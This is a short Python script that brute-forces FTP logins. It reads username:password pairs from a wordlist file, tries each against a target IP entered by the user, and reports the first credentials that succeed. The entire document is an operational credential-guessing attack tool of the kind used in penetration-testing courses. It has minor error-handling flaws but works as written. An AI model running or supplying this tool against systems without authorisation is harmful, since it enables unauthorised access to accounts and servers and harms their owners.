#!/usr/bin/python3

import ftplib


def bruteLogin(hostname, passwdFile):
    try:
        pf = open(passwdFile, "r")
    except:
        print("[!!] File doesnt exist!")
    for line in pf.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\n')
        print("[+] Trying: "+ userName + "/" + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(userName, passWord)
            print("[+] Login suceeded with: "+ userName + "/" + passWord )
            ftp.quit()
            return(userName,passWord)
        except:
            pass
    print("[-] Password not in list")

host = input("[*] Enter targets IP address: ")
passwdFile = input("[*] Enter user/passwords file path: ")
bruteLogin(host, passwdFile)

